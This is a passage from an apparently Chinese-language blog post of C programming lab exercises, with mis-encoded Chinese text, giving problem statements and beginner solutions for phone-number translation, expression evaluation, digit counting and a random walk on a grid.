class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="å®éªŒä¸‰"><a href="#å®éªŒä¸‰" class="headerlink" title="å®éªŒä¸‰"></a>å®éªŒä¸‰</h2><h3 id="ç¿»è¯‘ï¼ˆTranslationï¼‰"><a href="#ç¿»è¯‘ï¼ˆTranslationï¼‰" class="headerlink" title="ç¿»è¯‘ï¼ˆTranslationï¼‰"></a>ç¿»è¯‘ï¼ˆTranslationï¼‰</h3><blockquote><p>ç¼–å†™ç¨‹åºå¯ä»¥æŠŠå­—æ¯æ ¼å¼çš„ç”µè¯å·ç ç¿»è¯‘æˆæ•°å€¼æ ¼å¼ï¼š</p><blockquote><p>Enter phone number: CALLATT</p><p>2255288</p></blockquote><p>å¦‚æœæ²¡æœ‰ç”µè¯åœ¨èº«è¾¹,å‚è€ƒè¿™é‡Œç»™å‡ºçš„å­—æ¯åœ¨é”®ç›˜ä¸Šçš„å¯¹åº”å…³ç³»ï¼šï¼ˆ2&#x3D;ABCï¼Œ3&#x3D;DEFï¼Œ4&#x3D;GHIï¼Œ5&#x3D;JKLï¼Œ6&#x3D;MNOï¼Œ7&#x3D;PQRSï¼Œ8&#x3D;TUVï¼Œ9&#x3D;WXYZï¼‰åŸå§‹ç”µè¯å·ç ä¸­çš„éå­—æ¯å­—ç¬¦ï¼ˆä¾‹å¦‚æ•°å­—æˆ–æ ‡ç‚¹ç¬¦å·ï¼‰ä¿æŒä¸å˜ï¼š</p><p>Enter phone number: 1-800-COL-LECT1-800-265-5328</p><p>å¯ä»¥å‡è®¾ä»»ä½•ç”¨æˆ·è¾“å…¥çš„å­—æ¯éƒ½æ˜¯å¤§å†™å­—æ¯ã€‚</p><p><em><strong>è¾“å‡ºèŒƒä¾‹ï¼š</strong></em></p><blockquote><p>Enter phone number: 1-DCKS-A2D-OLED</p><p>1-3257-223-6533</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctype.h&gt;</span></span><br><br><span class="hljs-comment">// è²Œä¼¼æœ‰ç‚¹ç¬¨è¿™æ–¹æ³•</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> ch;<br>    <span class="hljs-keyword">while</span> ((ch = getchar()) != <span class="hljs-string">&#x27;\n&#x27;</span>)<br>    &#123;<br><br>        <span class="hljs-keyword">switch</span> (ch)<br>        &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;A&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;B&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;C&#x27;</span>:<br>            <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;2&#x27;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;D&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;E&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;F&#x27;</span>:<br>            <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;3&#x27;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;G&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;H&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;I&#x27;</span>:<br>            <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;4&#x27;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;J&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;K&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;L&#x27;</span>:<br>            <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;5&#x27;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;M&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;N&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;O&#x27;</span>:<br>            <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;6&#x27;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;P&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;Q&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;R&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;S&#x27;</span>:<br>            <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;7&#x27;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;T&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;V&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;U&#x27;</span>:<br>            <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;8&#x27;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;Y&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;W&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;X&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;Z&#x27;</span>:<br>            <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;9&#x27;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-built_in">putchar</span>(ch);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="è¡¨è¾¾å¼æ±‚å€¼ï¼ˆExpression-Evaluationï¼‰"><a href="#è¡¨è¾¾å¼æ±‚å€¼ï¼ˆExpression-Evaluationï¼‰" class="headerlink" title="è¡¨è¾¾å¼æ±‚å€¼ï¼ˆExpression Evaluationï¼‰"></a>è¡¨è¾¾å¼æ±‚å€¼ï¼ˆExpression Evaluationï¼‰</h3><blockquote><p>ç¼–å†™ç¨‹åºå¯¹è¡¨è¾¾å¼æ±‚å€¼ã€‚</p><blockquote><p>Enter an expression: 1+2.5*3<br>Value of expression: 10.5</p></blockquote><p>è¡¨è¾¾å¼ä¸­çš„æ“ä½œæ•°æ˜¯æµ®ç‚¹æ•°ï¼Œè¿ç®—ç¬¦æ˜¯+ã€-ã€*å’Œ&#x2F;ã€‚è¡¨è¾¾å¼ä»å·¦å‘å³æ±‚å€¼ï¼ˆæ‰€æœ‰è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§éƒ½â¼€æ ·ï¼‰ã€‚</p><p><em><strong>è¾“å‡ºèŒƒä¾‹ï¼š</strong></em></p><blockquote><p>Enter an expression: 2+3*4-5&#x2F;2<br>Value of expression: 7.5</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> ch;<br>    <span class="hljs-type">float</span> num, num2;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%f&quot;</span>, &amp;num);<br>    <span class="hljs-keyword">while</span> ((ch = getchar()) != <span class="hljs-string">&#x27;\n&#x27;</span>)<br>    &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%f&quot;</span>, &amp;num2);<br>        <span class="hljs-keyword">switch</span> (ch)<br>        &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;+&#x27;</span>:<br>            num += num2;<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;-&#x27;</span>:<br>            num -= num2;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;*&#x27;</span>:<br>            num *= num2;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;/&#x27;</span>:<br>            num /= num2;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%f&quot;</span>, num);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="å‡ºç°æ¬¡æ•°ï¼ˆNumber-Occurrencesï¼‰"><a href="#å‡ºç°æ¬¡æ•°ï¼ˆNumber-Occurrencesï¼‰" class="headerlink" title="å‡ºç°æ¬¡æ•°ï¼ˆNumber Occurrencesï¼‰"></a>å‡ºç°æ¬¡æ•°ï¼ˆNumber Occurrencesï¼‰</h3><blockquote><p>ä¿®æ”¹å¦‚ä¸‹ç¨‹åºï¼Œä½¿å…¶æ‰“å°â¼€ä»½åˆ—è¡¨ï¼Œæ˜¾ç¤ºå‡ºæ¯ä¸ªæ•°å­—åœ¨æ•°ä¸­å‡ºç°çš„æ¬¡æ•°ã€‚</p><p><em><strong>è¾“å‡ºèŒƒä¾‹ï¼š</strong></em></p><blockquote><p>Enter a number: 41271092</p><table><thead><tr><th align="center">Digit:</th><th align="center">0</th><th align="center">1</th><th align="center">2</th><th align="center">3</th><th align="center">4</th><th align="center">5</th><th align="center">6</th><th align="center">7</th><th align="center">8</th><th align="center">9</th></tr></thead><tbody><tr><td align="center">Occurrences:</td><td align="center">1</td><td align="center">2</td><td align="center">2</td><td align="center">0</td><td align="center">1</td><td align="center">0</td><td align="center">0</td><td align="center">1</td><td align="center">0</td><td align="center">1</td></tr></tbody></table></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> num;<br>    <span class="hljs-type">int</span> occ[<span class="hljs-number">10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Digit:0123456789&quot;</span>);<br>    <span class="hljs-keyword">while</span> ((num = getchar()) != <span class="hljs-string">&#x27;\n&#x27;</span>)<br>    &#123;<br>        <span class="hljs-keyword">switch</span> (num)<br>        &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;0&#x27;</span>:<br>            occ[<span class="hljs-number">0</span>]++;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;1&#x27;</span>:<br>            occ[<span class="hljs-number">1</span>]++;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;2&#x27;</span>:<br>            occ[<span class="hljs-number">2</span>]++;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;3&#x27;</span>:<br>            occ[<span class="hljs-number">3</span>]++;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;4&#x27;</span>:<br>            occ[<span class="hljs-number">4</span>]++;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;5&#x27;</span>:<br>            occ[<span class="hljs-number">5</span>]++;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;6&#x27;</span>:<br>            occ[<span class="hljs-number">6</span>]++;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;7&#x27;</span>:<br>            occ[<span class="hljs-number">7</span>]++;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;8&#x27;</span>:<br>            occ[<span class="hljs-number">8</span>]++;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;9&#x27;</span>:<br>            occ[<span class="hljs-number">9</span>]++;<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Occurrences:&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, occ[i]);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="éšæœºæ­¥æ³•ï¼ˆRandom-Walkï¼‰"><a href="#éšæœºæ­¥æ³•ï¼ˆRandom-Walkï¼‰" class="headerlink" title="éšæœºæ­¥æ³•ï¼ˆRandom Walkï¼‰"></a>éšæœºæ­¥æ³•ï¼ˆRandom Walkï¼‰</h3><blockquote><p>ç¼–å†™ç¨‹åºï¼Œç”Ÿæˆä¸€ç§è´¯ç©¿10Ã—10å­—ç¬¦æ•°ç»„ï¼ˆåˆå§‹æ—¶å…¨ä¸ºå­—ç¬¦â€™.â€™ï¼‰çš„â€œéšæœºæ­¥æ³•â€ã€‚ç¨‹åºå¿…é¡»éšæœºåœ°ä»ä¸€ä¸ªå…ƒç´ â€œèµ°åˆ°â€å¦ä¸€ä¸ªå…ƒç´ ï¼Œæ¯æ¬¡éƒ½å‘ä¸Šã€å‘ä¸‹ã€å‘å·¦æˆ–å‘å³ç§»åŠ¨ä¸€ä¸ªå…ƒç´ ä½ç½®ã€‚å·²è®¿é—®è¿‡çš„å…ƒç´ æŒ‰è®¿é—®é¡ºåºç”¨å­—æ¯Aåˆ°Zè¿›è¡Œæ ‡è®°ã€‚</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ª<em><strong>è¾“å‡ºç¤ºä¾‹ï¼š</strong></em></p><table><thead><tr><th align="center">A</th><th align="center">.</th><th align="center">.</th><th align="center">.</th><th align="center">.</th><th align="center">.</th><th align="center">.</th><th align="center">.</th><th align="center">.</th><th align="center">.</th></tr></thead><tbody><tr><td align="center">B</td><td align="center">C</td><td align="center">D</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td></tr><tr><td align="center">.</td><td align="center">F</td><td align="center">E</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td></tr><tr><td align="center">H</td><td align="center">G</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td></tr><tr><td align="center">I</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td></tr><tr><td align="center">J</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">Z</td><td align="center">.</td></tr><tr><td align="center">K</td><td align="center">.</td><td align="center">.</td><td align="center">R</td><td align="center">S</td><td align="center">T</td><td align="center">U</td><td align="center">V</td><td align="center">Y</td><td align="center">.</td></tr><tr><td align="center">L</td><td align="center">M</td><td align="center">P</td><td align="center">Q</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">W</td><td align="center">X</td><td align="center">.</td></tr><tr><td align="center">.</td><td align="center">N</td><td align="center">O</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td></tr></tbody></table><p>åˆ©ç”¨srandå‡½æ•°å’Œrandå‡½æ•°äº§ç”Ÿéšæœºæ•°ï¼Œç„¶åæŸ¥çœ‹æ¬¡æ•°é™¤ä»¥4çš„ä½™æ•°ã€‚ä½™æ•°ä¸€å…±æœ‰4ç§å¯èƒ½çš„å€¼ï¼ˆ0ã€1ã€2å’Œ3ï¼‰ï¼ŒæŒ‡ç¤ºä¸‹ä¸€æ¬¡ç§»åŠ¨çš„4ç§å¯èƒ½æ–¹å‘ã€‚åœ¨æ‰§è¡Œç§»åŠ¨ä¹‹å‰ï¼Œéœ€è¦æ£€æŸ¥ä¸¤é¡¹å†…å®¹ï¼šä¸€æ˜¯ä¸èƒ½èµ°åˆ°æ•°ç»„å¤–é¢ï¼ŒäºŒæ˜¯ä¸èƒ½èµ°åˆ°å·²æœ‰å­—æ¯æ ‡è®°çš„ä½ç½®ã€‚åªè¦ä¸€ä¸ªæ¡ä»¶ä¸æ»¡è¶³ï¼Œå°±å¾—å°è¯•æ¢ä¸€ä¸ªæ–¹å‘ç§»åŠ¨ã€‚å¦‚æœ4ä¸ªæ–¹å‘éƒ½å µä½äº†ï¼Œç¨‹åºå°±å¿…é¡»ç»ˆæ­¢äº†ã€‚ä¸‹é¢æ˜¯æå‰ç»“æŸçš„ä¸€ä¸ªç¤ºä¾‹:</p><table><thead><tr><th align="center">A</th><th align="center">B</th><th align="center">G</th><th align="center">H</th><th align="center">I</th><th align="center">.</th><th align="center">.</th><th align="center">.</th><th align="center">.</th><th align="center">.</th></tr></thead><tbody><tr><td align="center">.</td><td align="center">C</td><td align="center">F</td><td align="center">O</td><td align="center">J</td><td align="center">K</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td></tr><tr><td align="center">.</td><td align="center">D</td><td align="center">E</td><td align="center">N</td><td align="center">M</td><td align="center">L</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td></tr><tr><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td></tr><tr><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td></tr><tr><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td></tr><tr><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td></tr><tr><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td></tr><tr><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td></tr></tbody></table><p>å› ä¸ºYçš„4ä¸ªæ–¹å‘éƒ½å µä½äº†ï¼Œæ‰€ä»¥æ²¡æœ‰åœ°æ–¹å¯ä»¥æ”¾ç½®ä¸‹ä¸€æ­¥çš„Zäº†ã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">PrintMap</span><span class="hljs-params">(<span class="hljs-type">char</span> Map[<span class="hljs-number">10</span>][<span class="hljs-number">10</span>])</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">10</span>; j++)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c &quot;</span>, Map[i][j]);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">SelectToward</span><span class="hljs-params">(<span class="hljs-type">int</span> begin[<span class="hljs-number">2</span>], <span class="hljs-type">char</span> Map[<span class="hljs-number">10</span>][<span class="hljs-number">10</span>], <span class="hljs-type">int</span> toward, <span class="hljs-type">int</span> index, <span class="hljs-type">int</span> boom)</span><br>&#123;<br><br>    boom++;<br>    <span class="hljs-type">char</span> alphabet[<span class="hljs-number">26</span>] = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;<br>    <span class="hljs-keyword">switch</span> (toward)<br>    &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">if</span> (begin[<span class="hljs-number">0</span>] - <span class="hljs-number">1</span> &gt;= <span class="hljs-number">0</span> &amp;&amp; Map[begin[<span class="hljs-number">0</span>] - <span class="hljs-number">1</span>][begin[<span class="hljs-number">1</span>]] == <span class="hljs-string">&#x27;.&#x27;</span>)<br>        &#123;<br>            Map[begin[<span class="hljs-number">0</span>] - <span class="hljs-number">1</span>][begin[<span class="hljs-number">1</span>]] = alphabet[index];<br>            begin[<span class="hljs-number">0</span>] -= <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-keyword">return</span> boom != <span class="hljs-number">4</span> ? SelectToward(begin, Map, (toward + <span class="hljs-number">1</span>) % <span class="hljs-number">4</span>, index, boom) : <span class="hljs-number">1</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">if</span> (begin[<span class="hljs-number">0</span>] + <span class="hljs-number">1</span> &lt; <span class="hljs-number">10</span> &amp;&amp; Map[begin[<span class="hljs-number">0</span>] + <span class="hljs-number">1</span>][begin[<span class="hljs-number">1</span>]] == <span class="hljs-string">&#x27;.&#x27;</span>)<br>        &#123;<br>            Map[begin[<span class="hljs-number">0</span>] + <span class="hljs-number">1</span>][begin[<span class="hljs-number">1</span>]] = alphabet[index];<br>            begin[<span class="hljs-number">0</span>] += <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-keyword">return</span> boom != <span class="hljs-number">4</span> ? SelectToward(begin, Map, (toward + <span class="hljs-number">1</span>) % <span class="hljs-number">4</span>, index, boom) : <span class="hljs-number">1</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">break</span>;<br>    <span 